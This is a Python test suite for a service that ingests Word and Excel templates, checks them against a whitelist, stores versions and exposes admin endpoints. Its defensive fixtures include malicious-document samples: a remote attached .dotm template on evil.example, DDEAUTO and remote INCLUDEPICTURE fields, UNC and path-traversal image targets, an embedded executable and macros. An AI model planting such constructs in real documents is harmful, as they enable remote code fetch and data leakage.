"""E18 templates: the DOCX frame taken from a Word template (whitelist, fail
closed), the store with its versions, the sample spreadsheet's header row,
and the administration endpoints over HTTP (clamd and the RAG are fakes)."""
import base64
import io
import json
import os
import tempfile
import unittest
import urllib.parse
import zipfile
from unittest.mock import patch

import docgen
import integration
import investigation_export
import templates
import xlsx
from store_http_test import StandaloneHttpCase

W, R, A = templates.W, templates.R, templates.A
REL = templates.REL
OOXML = "application/vnd.openxmlformats-officedocument."
PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 24


def _types(main=OOXML + "wordprocessingml.document.main+xml", extra=""):
    parts = (("/word/document.xml", main),
             ("/word/styles.xml", OOXML + "wordprocessingml.styles+xml"),
             ("/word/numbering.xml", OOXML + "wordprocessingml.numbering+xml"),
             ("/word/settings.xml", OOXML + "wordprocessingml.settings+xml"),
             ("/word/theme/theme1.xml", OOXML + "theme+xml"),
             ("/word/header1.xml", OOXML + "wordprocessingml.header+xml"),
             ("/word/footer1.xml", OOXML + "wordprocessingml.footer+xml"))
    return ('<?xml version="1.0" encoding="UTF-8"?><Types xmlns="%s">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.'
            'relationships+xml"/><Default Extension="xml" ContentType="application/xml"/>'
            '<Default Extension="png" ContentType="image/png"/>%s%s</Types>') % (
        templates.TYPES_NS, "".join('<Override PartName="%s" ContentType="%s"/>' % p
                                    for p in parts), extra)


def _rels(*items):
    return ('<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="%s">%s</Relationships>'
            % (templates.PKG, "".join(
                '<Relationship Id="%s" Type="%s%s" Target="%s"%s/>' % (
                    rid, REL if "/" not in kind else "", kind, target,
                    ' TargetMode="External"' if external else "")
                for rid, kind, target, external in items)))


DOCUMENT = (
    '<w:document xmlns:w="%s" xmlns:r="%s"><w:body><w:p><w:r><w:t>Template body text'
    '</w:t></w:r></w:p><w:sectPr><w:headerReference w:type="default" r:id="rId8"/>'
    '<w:footerReference w:type="default" r:id="rId9"/>'
    '<w:pgSz w:w="16838" w:h="11906" w:orient="landscape"/>'
    '<w:pgMar w:top="1417" w:right="1417" w:bottom="1417" w:left="1417" w:header="708" '
    'w:footer="708" w:gutter="0"/></w:sectPr></w:body></w:document>') % (W, R)
STYLES = (
    '<w:styles xmlns:w="%s"><w:docDefaults><w:rPrDefault><w:rPr><w:rFonts w:ascii="Garamond"/>'
    '</w:rPr></w:rPrDefault></w:docDefaults>'
    '<w:style w:type="paragraph" w:default="1" w:styleId="Norml"><w:name w:val="Normal"/>'
    '</w:style><w:style w:type="paragraph" w:styleId="Cmsor1"><w:name w:val="heading 1"/>'
    '</w:style><w:style w:type="paragraph" w:styleId="Cmsor2"><w:name w:val="heading 2"/>'
    '</w:style><w:style w:type="paragraph" w:styleId="Felsorols"><w:name w:val="List Bullet"/>'
    '<w:pPr><w:numPr><w:numId w:val="1"/></w:numPr></w:pPr></w:style></w:styles>') % W
NUMBERING = ('<w:numbering xmlns:w="%s"><w:abstractNum w:abstractNumId="0"><w:lvl w:ilvl="0">'
             '<w:numFmt w:val="bullet"/></w:lvl></w:abstractNum><w:num w:numId="1">'
             '<w:abstractNumId w:val="0"/></w:num></w:numbering>') % W
THEME = ('<a:theme xmlns:a="%s" name="Office"><a:themeElements><a:fontScheme name="x">'
         '<a:majorFont><a:latin typeface="Georgia"/></a:majorFont><a:minorFont>'
         '<a:latin typeface="Verdana"/></a:minorFont></a:fontScheme></a:themeElements>'
         '</a:theme>') % A
SETTINGS = ('<w:settings xmlns:w="%s"><w:evenAndOddHeaders/><w:compat><w:compatSetting '
            'w:name="compatibilityMode" w:uri="http://schemas.microsoft.com/office/word" '
            'w:val="14"/></w:compat></w:settings>') % W


def header(inner=""):
    return ('<w:hdr xmlns:w="%s" xmlns:r="%s" xmlns:v="urn:schemas-microsoft-com:vml"><w:p>'
            '<w:r><w:pict><v:shape><v:imagedata r:id="rId1"/></v:shape></w:pict></w:r>'
            '<w:hyperlink r:id="rId2"><w:r><w:t>www.example.hu</w:t></w:r></w:hyperlink>'
            '<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> PA</w:instrText>'
            '</w:r><w:r><w:instrText>GE </w:instrText></w:r><w:r><w:fldChar '
            'w:fldCharType="separate"/></w:r><w:r><w:t>1</w:t></w:r><w:r><w:fldChar '
            'w:fldCharType="end"/></w:r>%s</w:p></w:hdr>') % (W, R, inner)


HEADER_RELS = (("rId1", "image", "media/image1.png", False),
               ("rId2", "hyperlink", "https://www.example.hu/", True))
FOOTER = ('<w:ftr xmlns:w="%s"><w:p><w:fldSimple w:instr=" NUMPAGES "><w:r><w:t>1</w:t></w:r>'
          '</w:fldSimple></w:p></w:ftr>') % W


def word_file(**over):
    """A small Word-like package: Hungarian style ids, a header with a logo, a
    page field split over runs and a link, a footer, list numbering, a theme.
    `over` replaces parts by name; None removes one."""
    parts = {
        "[Content_Types].xml": _types(),
        "_rels/.rels": _rels(("rId1", "officeDocument", "word/document.xml", False)),
        "word/document.xml": DOCUMENT,
        "word/_rels/document.xml.rels": _rels(
            ("rId1", "styles", "styles.xml", False), ("rId2", "numbering", "numbering.xml", False),
            ("rId3", "theme", "theme/theme1.xml", False), ("rId4", "settings", "settings.xml", False),
            ("rId8", "header", "header1.xml", False), ("rId9", "footer", "footer1.xml", False),
            # The body is not used, so its objects are never looked at.
            ("rId20", "oleObject", "embeddings/oleObject1.bin", False)),
        "word/styles.xml": STYLES, "word/numbering.xml": NUMBERING,
        "word/theme/theme1.xml": THEME, "word/settings.xml": SETTINGS,
        # A template attached from a server: settings are not copied.
        "word/_rels/settings.xml.rels": _rels(
            ("rId1", "attachedTemplate", "http://evil.example/t.dotm", True)),
        "word/header1.xml": header(), "word/_rels/header1.xml.rels": _rels(*HEADER_RELS),
        "word/footer1.xml": FOOTER, "word/media/image1.png": PNG,
    }
    parts.update(over)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for name, data in parts.items():
            if data is not None:
                z.writestr(name, data.encode("utf-8") if isinstance(data, str) else data)
    return buf.getvalue()


def unzip(blob):
    with zipfile.ZipFile(io.BytesIO(blob)) as z:
        return {name: z.read(name) for name in z.namelist()}


class DocxFrameTest(unittest.TestCase):
    def test_styles_page_and_header_parts_are_kept(self):
        frame = templates.read_docx_frame(word_file())
        self.assertEqual(frame.styles, {"h1": "Cmsor1", "h2": "Cmsor2", "bullet": "Felsorols"})
        self.assertEqual(frame.summary["page"], {"width_mm": 297, "height_mm": 210,
                                                 "landscape": True})
        self.assertEqual(frame.summary["fonts"], {"headings": "Georgia", "body": "Garamond"})
        self.assertEqual((frame.summary["headers"], frame.summary["footers"],
                          frame.summary["pictures"], frame.summary["links"]), (1, 1, 1, 1))
        self.assertEqual((frame.even_odd, frame.compat, frame.summary["added_styles"]),
                         (True, 14, []))
        files = unzip(docgen.render_docx("# Report\n\n## Part\n\n- one\n- two\nbody", "T", frame))
        document = files["word/document.xml"].decode()
        self.assertIn('<w:pStyle w:val="Cmsor1"/>', document)
        self.assertIn('<w:pStyle w:val="Cmsor2"/>', document)
        # The template's bullet style numbers the list; no bullet character is added.
        self.assertIn('<w:pStyle w:val="Felsorols"/></w:pPr><w:r><w:t xml:space="preserve">one',
                      document)
        self.assertNotIn("Template body text", document)
        self.assertIn('<w:pgSz w:w="16838" w:h="11906" w:orient="landscape"/>', document)
        self.assertIn('<w:headerReference w:type="default" r:id="rId4"/>', document)
        self.assertEqual(files["word/media/image1.png"], PNG)
        rels = files["word/_rels/header1.xml.rels"].decode()
        self.assertIn('Target="media/image1.png"', rels)
        self.assertIn('Target="https://www.example.hu/" TargetMode="External"', rels)
        self.assertIn(b"<w:evenAndOddHeaders/>", files["word/settings.xml"])
        blob = b"".join(files.values())
        for gone in (b"evil.example", b"oleObject", b"Template body text"):
            self.assertNotIn(gone, blob)
        # What the box writes passes the same checks again.
        again = templates.read_docx_frame(docgen.render_docx("x", "", frame))
        self.assertEqual((again.styles, again.summary), (frame.styles, frame.summary))

    def test_a_missing_heading_style_is_added_and_bullets_fall_back(self):
        styles = ('<w:styles xmlns:w="%s"><w:style w:type="paragraph" w:default="1" '
                  'w:styleId="Normal"><w:name w:val="Normal"/></w:style><w:style '
                  'w:type="character" w:styleId="Heading1"><w:name w:val="x"/></w:style>'
                  '</w:styles>') % W
        frame = templates.read_docx_frame(word_file(**{"word/styles.xml": styles}))
        self.assertEqual(frame.styles, {"h1": "VivesecHeading1", "h2": "Heading2",
                                        "bullet": None})
        self.assertEqual(frame.summary["added_styles"], ["heading 1", "heading 2"])
        document = unzip(docgen.render_docx("- one", "", frame))["word/document.xml"].decode()
        self.assertIn("\u2022 one", document)
        again = templates.read_docx_frame(frame.package("", templates.frame_core("t")))
        self.assertEqual(again.styles["h1"], "VivesecHeading1")
        self.assertEqual(again.summary["added_styles"], [])

    def test_a_document_without_page_setup_gets_a4(self):
        document = '<w:document xmlns:w="%s"><w:body><w:p/></w:body></w:document>' % W
        frame = templates.read_docx_frame(word_file(**{"word/document.xml": document}))
        self.assertEqual((frame.summary["page"]["width_mm"], frame.summary["headers"]), (210, 0))

    def refused(self, code, raw):
        with self.assertRaises(templates.TemplateInvalid) as caught:
            templates.read_docx_frame(raw)
        self.assertEqual(caught.exception.code, code, caught.exception)

    def test_anything_that_could_act_on_its_own_refuses_the_upload(self):
        header_rels = "word/_rels/header1.xml.rels"
        cases = {
            "macros": [word_file(**{"word/vbaProject.bin": b"x"}),
                       word_file(**{"[Content_Types].xml": _types(
                           "application/vnd.ms-word.document.macroEnabled.main+xml")})],
            "linked_content": [
                word_file(**{header_rels: _rels(("rId1", "image", "http://x/logo.png", True),
                                                HEADER_RELS[1])}),
                word_file(**{header_rels: _rels(HEADER_RELS[0],
                                                ("rId2", "hyperlink", "file://srv/x", True))}),
                word_file(**{"word/header1.xml": header(
                    '<w:r><w:pict><v:shape><v:imagedata src="\\\\srv\\x.png"/></v:shape>'
                    '</w:pict></w:r>')}),
                word_file(**{header_rels: _rels(("rId1", "image", "media/logo.svg", False),
                                                HEADER_RELS[1]),
                             "word/media/logo.svg": '<svg xmlns="http://www.w3.org/2000/svg">'
                                                    '<image href="https://x/a.png"/></svg>'})],
            "unsupported_content": [
                word_file(**{header_rels: _rels(*HEADER_RELS, ("rId3", "oleObject",
                                                               "embeddings/o.bin", False))}),
                word_file(**{"word/styles.xml": '<!DOCTYPE x [<!ENTITY a "b">]>' + STYLES})],
            "unsafe_field": [
                word_file(**{"word/header1.xml": header(
                    '<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>INCLUDE'
                    '</w:instrText></w:r><w:r><w:instrText>PICTURE "http://x/a.png" \\d'
                    '</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>')}),
                word_file(**{"word/footer1.xml": FOOTER.replace("NUMPAGES", "DDEAUTO c:\\x")})],
            "unsupported_layout": [
                word_file(**{header_rels: _rels(("rId1", "image", "../../../etc/passwd.png",
                                                 False), HEADER_RELS[1])})],
            "picture_type": [word_file(**{"word/media/image1.png": b"GIF89a" + b"\x00" * 20}),
                             word_file(**{header_rels: _rels(
                                 ("rId1", "image", "media/x.exe", False), HEADER_RELS[1]),
                                 "word/media/x.exe": b"MZ"})],
            "not_docx": [b"hello", xlsx.workbook([{"name": "a", "rows": [["x"]]}]),
                         word_file(**{"word/document.xml": None,
                                      "[Content_Types].xml": _types(OOXML + "x")})],
            "broken": [word_file(**{"word/header1.xml": "<w:hdr"})],
        }
        for code, blobs in cases.items():
            for blob in blobs:
                self.refused(code, blob)
        with patch.object(templates, "MAX_UPLOAD_BYTES", 100):
            self.refused("too_large", word_file())


def sample_sheet():
    return xlsx.workbook([{"name": "Lap1", "widths": [30, 15, 25, 40, 50], "rows": [
        ["Név", "Születési dátum", "Anyja neve", "Megjegyzés", "Forrás"], ["Kiss", "x"]]}])


def shared_strings_sheet():
    s = templates.S
    parts = {
        "[Content_Types].xml": '<Types xmlns="%s"/>' % templates.TYPES_NS,
        "_rels/.rels": _rels(("rId1", "officeDocument", "xl/workbook.xml", False)),
        "xl/workbook.xml": '<workbook xmlns="%s" xmlns:r="%s"><sheets><sheet name="A" '
                           'sheetId="1" r:id="rId1"/></sheets></workbook>' % (s, R),
        "xl/_rels/workbook.xml.rels": _rels(("rId1", "worksheet", "worksheets/s1.xml", False),
                                            ("rId2", "sharedStrings", "sharedStrings.xml", False)),
        "xl/sharedStrings.xml": '<sst xmlns="%s"><si><t>Title</t></si><si><r><t>Nyilv. </t>'
                                '</r><r><t>szám</t></r></si><si><t>Forrás</t></si></sst>' % s,
        "xl/worksheets/s1.xml": '<worksheet xmlns="%s"><sheetData><row r="1"/><row r="2">'
                                '<c r="B2" t="s"><v>1</v></c><c r="D2" t="s"><v>2</v></c>'
                                '<c r="E2"><v>7</v></c></row></sheetData></worksheet>' % s}
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for name, data in parts.items():
            z.writestr(name, data)
    return buf.getvalue()


class SampleSheetTest(unittest.TestCase):
    def test_header_row_and_widths_give_a_proposed_layout(self):
        headers = templates.read_xlsx_header(sample_sheet())
        self.assertEqual([h["label"] for h in headers],
                         ["Név", "Születési dátum", "Anyja neve", "Megjegyzés", "Forrás"])
        self.assertEqual([h["width"] for h in headers], [30, 15, 25, 40, 50])
        layout = investigation_export.propose_layout(headers)
        self.assertEqual([c["column"] for c in layout],
                         ["name", "birth_date", "mother_name", None, "source"])
        self.assertEqual(investigation_export.validate_layout(layout)[3],
                         {"column": None, "label": "Megjegyzés", "width": 40.0})

    def test_shared_strings_and_the_first_row_with_text(self):
        headers = templates.read_xlsx_header(shared_strings_sheet())
        self.assertEqual([h["label"] for h in headers], ["Nyilv. szám", "Forrás", "7"])
        self.assertEqual([c["column"] for c in investigation_export.propose_layout(headers)],
                         ["registry_number", "source", None])

    def test_unusable_samples(self):
        for code, blob in (("not_xlsx", b"x"), ("not_xlsx", word_file()),
                           ("no_header", xlsx.workbook([{"name": "a", "rows": []}]))):
            with self.assertRaises(templates.TemplateInvalid) as caught:
                templates.read_xlsx_header(blob)
            self.assertEqual(caught.exception.code, code)


class TemplateStoreTest(unittest.TestCase):
    def setUp(self):
        temp = tempfile.TemporaryDirectory()
        self.addCleanup(temp.cleanup)
        self.root = os.path.join(temp.name, "templates")
        self.store = templates.TemplateStore(self.root)

    def test_versions_activation_and_the_built_in_fallback(self):
        meta = self.store.add_docx(word_file(), "C:\\work\\Arculat.dotx", "admin", now=10)
        self.assertEqual((meta["name"], meta["uploaded_by"], meta["uploaded_at"]),
                         ("Arculat.dotx", "admin", 10))
        # A new version is not used until it is activated.
        self.assertIsNone(self.store.docx_frame())
        self.assertEqual(self.store.docx_frame(meta["id"]).styles["h1"], "Cmsor1")
        self.store.activate_docx(meta["id"], "admin")
        self.assertEqual(self.store.docx_frame().styles["h1"], "Cmsor1")
        stored = os.path.join(self.root, "docx", meta["id"] + ".docx")
        with open(stored, "rb") as handle:
            self.assertNotIn(b"Template body text", handle.read())
        with self.assertRaises(KeyError):
            self.store.activate_docx("0" * 24, "admin")
        # A stored frame that no longer reads gives the built-in look.
        with open(stored, "wb") as handle:
            handle.write(b"broken")
        fresh = templates.TemplateStore(self.root)
        self.assertIsNone(fresh.docx_frame())
        with self.assertRaises(templates.TemplateInvalid):
            fresh.activate_docx(meta["id"], "admin")
        fresh.activate_docx(None, "admin")
        self.assertIsNone(fresh.state()["docx"]["active"])

    def test_old_versions_are_pruned_but_the_active_one_is_kept(self):
        with patch.object(templates, "MAX_VERSIONS", 2):
            first = self.store.add_docx(word_file(), "a.docx", "admin")
            self.store.activate_docx(first["id"], "admin")
            ids = [self.store.add_docx(word_file(**{"word/footer1.xml": FOOTER.replace(
                "NUMPAGES", "PAGE" + " " * n)}), "%d.docx" % n, "admin")["id"] for n in range(3)]
        kept = [v["id"] for v in self.store.state()["docx"]["versions"]]
        self.assertEqual(kept, [ids[2], first["id"]])
        self.assertEqual(sorted(os.listdir(os.path.join(self.root, "docx"))),
                         sorted(v + ".docx" for v in kept))

    def test_layout_card_and_an_unreadable_state(self):
        self.store.set_layout([{"column": "name", "label": "Név", "width": None}], "admin")
        self.store.set_org_card({"name": "BV", "about": "", "terms": []}, "admin")
        self.assertEqual(self.store.layout()[0]["label"], "Név")
        self.assertEqual(self.store.org_card()["name"], "BV")
        with open(os.path.join(self.root, "state.json"), "w") as handle:
            handle.write("{nope")
        self.assertIsNone(self.store.layout())
        self.assertEqual(self.store.state()["error"], "state unreadable")

    def test_off_without_a_directory(self):
        store = templates.TemplateStore.from_env({"ADAPTER_TEMPLATES_DIR": " "})
        self.assertFalse(store.configured)
        with self.assertRaises(templates.TemplateInvalid) as caught:
            store.add_docx(word_file(), "a.docx", "admin")
        self.assertEqual(caught.exception.code, "templates_not_configured")
        self.assertIsNone(store.docx_frame())
        self.assertEqual(templates.TemplateStore.from_env({}).root, templates.DEFAULT_DIR)


class StreamScanner:
    def __init__(self):
        self.down = False

    def scan_stream(self, stream):
        import clamd
        if self.down:
            raise clamd.ScanUnavailable("down")
        return ("infected", "Eicar") if b"EICAR" in stream.read() else ("clean", None)


class TemplatesHttpTest(StandaloneHttpCase):
    def setUp(self):
        super().setUp()
        self.templates = templates.TemplateStore(os.path.join(self.dir.name, "templates"))
        self.clamd = StreamScanner()
        for name, value in (("TEMPLATES", self.templates), ("CLAMD", self.clamd)):
            patcher = patch.object(self.service, name, value)
            patcher.start()
            self.addCleanup(patcher.stop)

    def send(self, method, path, body=None, raw=None, name=None, **who):
        who.setdefault("drives", ())
        headers = self.headers(**who)
        headers.pop("VVS-Drive")
        data = raw
        if body is not None:
            data = json.dumps(body).encode("utf-8")
            headers["Content-Type"] = "application/json"
        elif raw is not None:
            headers["Content-Type"] = "application/octet-stream"
            if name:
                headers["X-Template-Name"] = urllib.parse.quote(name)
        status, answer, _ = self.request(method, path, data, headers)
        return status, (json.loads(answer.decode("utf-8")) if answer else {})

    def preview(self, version=None):
        status, body = self.send("POST", "/api/v1/ui/admin/templates/docx/preview",
                                 {"id": version, "text": "# Report\n\nbody", "title": "T"})
        self.assertEqual(status, 200, body)
        return unzip(base64.b64decode(body["content_b64"]))

    def test_only_administrators_in_standalone_mode(self):
        calls = (("GET", "/api/v1/ui/admin/templates", None, None),
                 ("POST", "/api/v1/ui/admin/templates/docx", None, word_file()),
                 ("POST", "/api/v1/ui/admin/templates/docx/activate", {"id": None}, None),
                 ("POST", "/api/v1/ui/admin/templates/docx/preview", {"text": "x"}, None),
                 ("POST", "/api/v1/ui/admin/templates/xlsx/read", None, sample_sheet()),
                 ("POST", "/api/v1/ui/admin/templates/xlsx", {"columns": None}, None),
                 ("POST", "/api/v1/ui/admin/templates/org", {"card": None}, None))
        for method, path, body, raw in calls:
            status, answer = self.send(method, path, body, raw, roles=("analyst",))
            self.assertEqual((status, answer.get("error")), (403, "forbidden"), path)
            with patch.object(self.service, "INTEGRATION", integration.MODE_VIVESECBOX):
                status, _ = self.send(method, path, body, raw)
                self.assertEqual(status, 404, path)
        self.assertEqual(self.templates.state()["docx"]["versions"], [])

    def test_upload_preview_and_activate_a_word_template(self):
        status, body = self.send("POST", "/api/v1/ui/admin/templates/docx", raw=word_file(),
                                 name="Arculat sablon.dotx")
        self.assertEqual(status, 200, body)
        version = body["version"]
        self.assertEqual((version["name"], version["uploaded_by"]), ("Arculat sablon.dotx", "anna"))
        self.assertIsNone(body["docx"]["active"])
        self.assertNotIn("word/header1.xml", self.preview())
        self.assertIn("word/header1.xml", self.preview(version["id"]))
        status, body = self.send("POST", "/api/v1/ui/admin/templates/docx/activate",
                                 {"id": version["id"]})
        self.assertEqual((status, body["docx"]["active"]), (200, version["id"]))
        files = self.preview()
        self.assertIn(b'w:val="Cmsor1"', files["word/document.xml"])
        # Every DOCX the box writes now has the frame.
        blob, _ = docgen.render("# x", "docx", frame=self.service.TEMPLATES.docx_frame())
        self.assertIn("word/footer1.xml", unzip(blob))
        status, body = self.send("POST", "/api/v1/ui/admin/templates/docx/activate", {"id": None})
        self.assertIsNone(body["docx"]["active"])
        self.assertNotIn("word/header1.xml", self.preview())
        status, _ = self.send("POST", "/api/v1/ui/admin/templates/docx/activate",
                              {"id": "f" * 24})
        self.assertEqual(status, 404)
        actions = [e["action"] for e in reversed(self.store.tail_events())]
        self.assertEqual(actions, ["template_upload", "template_activate", "template_activate"])

    def test_refused_uploads_are_logged_and_not_kept(self):
        status, body = self.send("POST", "/api/v1/ui/admin/templates/docx",
                                 raw=word_file(**{"word/vbaProject.bin": b"x"}))
        self.assertEqual((status, body["error"]), (422, "macros"))
        status, body = self.send("POST", "/api/v1/ui/admin/templates/docx",
                                 raw=word_file(**{"word/media/image1.png": PNG + b"EICAR"}))
        self.assertEqual((status, body["error"]), (422, "infected"))
        self.clamd.down = True
        status, body = self.send("POST", "/api/v1/ui/admin/templates/docx", raw=word_file())
        self.assertEqual((status, body["error"]), (503, "scanner_unavailable"))
        with patch.object(templates, "MAX_UPLOAD_BYTES", 100):
            status, body = self.send("POST", "/api/v1/ui/admin/templates/docx", raw=word_file())
        self.assertEqual((status, body["error"]), (413, "too_large"))
        self.assertEqual(self.templates.state()["docx"]["versions"], [])
        reasons = [e.get("reason") for e in reversed(self.store.tail_events())]
        self.assertEqual(reasons, ["macros", "infected", "scanner_unavailable"])

    def test_spreadsheet_layout_from_a_sample(self):
        status, body = self.send("POST", "/api/v1/ui/admin/templates/xlsx/read",
                                 raw=sample_sheet())
        self.assertEqual(status, 200, body)
        layout = body["columns"]
        self.assertEqual(layout[0], {"column": "name", "label": "Név", "width": 30})
        self.assertIsNone(self.templates.layout())
        status, body = self.send("POST", "/api/v1/ui/admin/templates/xlsx",
                                 {"columns": layout[:-1]})
        self.assertEqual((status, body["error"]), (400, "invalid_layout"))
        self.assertIn("source", body["message"])
        status, body = self.send("POST", "/api/v1/ui/admin/templates/xlsx", {"columns": layout})
        self.assertEqual(status, 200, body)
        self.assertEqual(self.templates.layout()[3]["label"], "Megjegyzés")
        self.send("POST", "/api/v1/ui/admin/templates/xlsx", {"columns": None})
        self.assertIsNone(self.templates.layout())

    def test_the_organisation_card_reaches_the_model(self):
        card = {"name": "Büntetés-végrehajtás", "about": "Prison\nservice",
                "terms": [{"term": "BV", "meaning": "büntetés-végrehajtás"}]}
        status, body = self.send("POST", "/api/v1/ui/admin/templates/org", {"card": card})
        self.assertEqual(status, 200, body)
        self.assertEqual(body["org_card"]["value"]["about"], "Prison service")
        block = self.service.llm.organisation_block()
        self.assertIn("- Name: Büntetés-végrehajtás", block)
        self.assertIn("  - BV: büntetés-végrehajtás", block)
        status, body = self.send("POST", "/api/v1/ui/admin/templates/org",
                                 {"card": {"terms": [{"term": "BV"}]}})
        self.assertEqual((status, body["error"]), (400, "invalid_card"))
        self.send("POST", "/api/v1/ui/admin/templates/org", {"card": None})
        self.assertEqual(self.service.llm.organisation_block(), "")

    def test_not_configured(self):
        with patch.object(self.service, "TEMPLATES", templates.TemplateStore(None)):
            status, body = self.send("POST", "/api/v1/ui/admin/templates/docx", raw=word_file())
            self.assertEqual((status, body["error"]), (409, "templates_not_configured"))
            status, body = self.send("POST", "/api/v1/ui/admin/templates/org",
                                     {"card": {"name": "x"}})
            self.assertEqual((status, body["error"]), (409, "templates_not_configured"))
            status, body = self.send("GET", "/api/v1/ui/admin/templates")
            self.assertEqual((status, body["configured"]), (200, False))


if __name__ == "__main__":
    unittest.main()
